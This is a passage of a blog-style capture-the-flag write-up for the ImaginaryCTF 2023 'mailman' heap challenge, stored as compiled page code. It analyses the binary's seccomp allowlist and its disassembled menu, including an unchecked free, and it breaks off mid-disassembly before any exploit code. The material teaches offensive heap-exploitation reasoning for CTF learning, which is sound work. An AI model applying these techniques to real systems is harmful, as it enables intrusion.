{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var l=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=>l(a,\"__esModule\",{value:!0});var u=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=>{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let e of d(s))!m.call(a,e)&&e!==\"default\"&&l(a,e,{get:()=>s[e],enumerable:!(c=p(s,e))||c.enumerable});return a},f=a=>k(t(l(a!=null?r(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var i=u((x,o)=>{o.exports=_jsx_runtime});var w={};N(w,{default:()=>g,frontmatter:()=>b});var n=f(i()),b={title:\"ImaginaryCTF 2023 \\u2013 mailman\",date:\"2023-07-24\",draft:!1,authors:[\"surg\"],tags:[\"Imaginary CTF 2023\",\"Assembly\",\"x86_64\",\"Reverse Engineering\",\"Binary Exploitation\",\"Pwn\"],summary:\"Because *every* protection had to be on.\",canonical:\"https://surg.dev/ictf23/\"};function _(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(c,{})})):c();function c(){let e=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",h2:\"h2\",ol:\"ol\",li:\"li\",pre:\"pre\",ul:\"ul\",em:\"em\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h1,{id:\"mailman-423pts-31-solves\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#mailman-423pts-31-solves\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"mailman (423pts, 31 solves)\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsx)(e.p,{children:\"I\\u2019m sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Flag is in \",(0,n.jsx)(e.code,{children:\"./flag.txt\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Attachments: \",(0,n.jsx)(e.a,{href:\"https://imaginaryctf.org/r/PIxtO#vuln\",children:\"https://imaginaryctf.org/r/PIxtO#vuln\"}),\" \",(0,n.jsx)(e.a,{href:\"https://imaginaryctf.org/r/c9Mk8#libc.so.6\",children:\"https://imaginaryctf.org/r/c9Mk8#libc.so.6\"})]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"imaginaryCTF ran this past weekend. I competed with \",(0,n.jsx)(e.a,{href:\"https://sekai.team/\",children:\"Project Sekai\"}),\", where we placed third. I helped solve \",(0,n.jsx)(e.code,{children:\"ret2lose\"}),\", \",(0,n.jsx)(e.code,{children:\"mailman\"}),\", \",(0,n.jsx)(e.code,{children:\"lcode\"}),\", and \",(0,n.jsx)(e.code,{children:\"vmdungeon\"}),\". I wanted to mainly focus on \",(0,n.jsx)(e.code,{children:\"mailman\"}),\" as that challenge I worked on the most and ended up with the full exploit chain.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"I\\u2019m also going to go through this entire exploit with a detailed explanation, as I find heap pwn to be constantly confusing, and there\\u2019s more and more techniques being used and employed in CTFs, so I hope that this explains why I used the tools and methods I did.\"}),`\n`,(0,n.jsxs)(e.h2,{id:\"table-of-contents\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#table-of-contents\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Table of Contents\"]}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#secrets\",children:\"My mailman has secrets\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#leaky\",children:\"Leaky Program\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#botcake\",children:\"One More Leak, now with cakes!\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#fsop\",children:\"ROP? I Like FSOP.\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#rop\",children:\"FSOP? I Like ROP.\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#tldr\",children:\"TLDR\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"#script\",children:\"Full Script (Annotated)\"})}),`\n`]}),`\n`,(0,n.jsxs)(e.h2,{id:\"my-mailman-has-secrets-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#my-mailman-has-secrets-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"My mailman has secrets \",(0,n.jsx)(\"a\",{name:\"secrets\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Mailman was a standard heapnote type challenge (I\\u2019ve seen it referred to as \",(0,n.jsx)(e.code,{children:\"CRUD\"}),\": \",(0,n.jsx)(e.code,{children:\"Create Read Update DELETE\"}),\"). Loading into the program, we\\u2019re given options to write, read, or send a letter:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`Welcome to the post office.\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Enter your choice below:\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`1. Write a letter\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`2. Send a letter\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`3. Read a letter\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`>\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Picking 1 allows us to specify an index, letter size (in bytes), and then send data, terminating on a new line. Picking 2 lets us pick an index, but seemingly does nothing, and picking 3 outputs the text of the letter that we select.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"We aren\\u2019t given source, so we have to look at it in a disassembler. The first thing Binary Ninja shows us in the \",(0,n.jsx)(e.code,{children:\"main\"}),\" function is \",(0,n.jsx)(e.code,{children:\"seccomp\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001365\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001385\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013\"}),\"a5      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013\"}),\"c5      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013e5\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_rule_add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fff0000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3c\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000013f\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"seccomp_load\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:['seccomp is a way to make a type of \"jail\" for linux programs. It restricts execution to a limited set of syscalls, and kills the program if it attempts to call banned ones. While one could probably parse out that this is setting up an allowlist of syscalls ',(0,n.jsx)(e.code,{children:\"0\"}),\", \",(0,n.jsx)(e.code,{children:\"1\"}),\", \",(0,n.jsx)(e.code,{children:\"2\"}),\", \",(0,n.jsx)(e.code,{children:\"5\"}),\", and \",(0,n.jsx)(e.code,{children:\"0x3c\"}),\", I don\\u2019t know seccomp by heart. Luckily, \",(0,n.jsx)(e.code,{children:\"seccomp-tools\"}),\" can tell us exactly what is going on here:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`srg@pop-os:~/CTF/ictf23/mailman$ seccomp-tools dump ./vuln\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` line  CODE  JT   JF      K\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0000: 0x20 0x00 0x00 0x00000004  A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` arch\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0001: 0x15 0x00 0x09 0xc000003e  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" ARCH_X86_64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0011\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0002: 0x20 0x00 0x00 0x00000000  A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` sys_number\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0003: 0x35 0x00 0x01 0x40000000  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<\"}),\" 0x40000000\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0005\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0004: 0x15 0x00 0x06 0xffffffff  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" 0xffffffff\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0011\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0005: 0x15 0x04 0x00 0x00000000  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0006: 0x15 0x03 0x00 0x00000001  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0007: 0x15 0x02 0x00 0x00000002  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"open\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0008: 0x15 0x01 0x00 0x00000005  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" fstat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0010\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0009: 0x15 0x00 0x01 0x0000003c  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"A \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"exit\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),` goto 0011\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0010: 0x06 0x00 0x00 0x7fff0000  \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"return\"}),` ALLOW\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" 0011: 0x06 0x00 0x00 0x00000000  \",(0,n.jsx)(e.span,{className:\"token builtin class-name\",children:\"return\"}),` KILL\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As expected, this only allows 64-bit syscalls \",(0,n.jsx)(e.code,{children:\"(A < 0x4000000)\"}),\", and of those, only permits \",(0,n.jsx)(e.code,{children:\"read, write, open, fstat, exit\"}),\". This means that when we do get some form of code execution, we have to open, read, and print the flag, rather than popping a shell with \",(0,n.jsx)(e.code,{children:\"execve\"}),\". Let\\u2019s look at the rest of the menu:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001478\"}),\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"true\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001478\"}),\"          \",(0,n.jsx)(e.span,{className:\"token function\",children:\"printf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"> \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001493\"}),\"          \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"int32_t\"}),` var_2c\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001493\"}),\"          \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__isoc99_scanf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"%d%*c\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\"var_2c\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001498\"}),\"          \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"int32_t\"}),\" rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` var_2c\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000149\"}),\"e          \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),\"bc              \",(0,n.jsx)(e.span,{className:\"token function\",children:\"puts\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"str\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"inidx\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"a7          \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"a7              \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 s\",(0,n.jsx)(e.span,{className:\"token operator\",children:\">\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"a7                  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"break\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b0              \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"c5                  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"int64_t\"}),\" rax_18 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"inidx\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"dd                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"printf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"letter size: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014f\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),\"                  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"uint64_t\"}),` bytes\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014f\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),\"                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__isoc99_scanf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"%lu%*c\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\"bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000151f\"}),\"                  mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"rax_18\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"malloc\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001532\"}),\"                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"printf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"content: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000155\"}),\"e                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"fgets\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"buf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"rax_18\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" n\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"d\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"stdin\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b5              \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b5                  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b5                      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"break\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000158\"}),\"d                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"mem\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"inidx\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),\"cd      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"puts\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"str\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"Invalid choice!\"'}),(0,n.jsx)(e.span,{className:\"token 